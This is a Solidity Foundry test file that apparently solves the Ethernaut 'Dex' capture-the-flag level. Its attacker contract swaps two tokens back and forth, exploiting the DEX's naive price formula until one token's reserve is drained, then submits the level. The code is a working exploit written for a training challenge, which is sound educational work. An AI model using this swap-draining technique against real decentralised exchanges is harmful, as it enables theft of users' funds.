// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDex {
  function token1() external returns(address);
  function token2() external returns(address);
  function approve(address spender, uint amount) external;
  function swap(address from, address to, uint amount) external;
  function balanceOf(address token, address account) external returns (uint);
}

contract DexAttacker {
  IDex internal dex;
  address public challengeAddress;

  constructor(address _challengeFactory) {
    challengeAddress = utils.createLevelInstance(_challengeFactory);
    dex = IDex(challengeAddress);
    dex.approve(challengeAddress, 100);
  }

  function attack() public {
    address from = dex.token1();
    address to = dex.token2();
    address tmp; // textbook flipping of two variables
    uint256 desiredSwapAmount;
    uint256 balanceDexFrom;

    while (true) {
      desiredSwapAmount = dex.balanceOf(from, address(this));
      balanceDexFrom = dex.balanceOf(from, address(dex));

      // keep your ask within the amounts in the dex
      // we arrive here by solving x * (to/from) = to, for x
      if (desiredSwapAmount > balanceDexFrom) {
        desiredSwapAmount = balanceDexFrom;
      }

      dex.swap(from, to, desiredSwapAmount);

      if (dex.balanceOf(to, address(dex)) == 0) {
        break;
      } else {
        tmp = from;
        from = to;
        to = tmp;
      }
    }

    // see comment at testExploit()
    utils.submitLevelInstance(challengeAddress);
  }
}

contract DexTest is Test {
  DexAttacker internal attackContract;

  function setUp() public {
    // give the factory to the attacker, so it can get tokens assigned
    attackContract = new DexAttacker(0xC084FC117324D7C628dBC41F17CAcAaF4765f49e);
  }

  function testExploit() public {
    // the contract needs to invoke submitLevelInstance
    // as they invoked the factory
    attackContract.attack();
  }
}
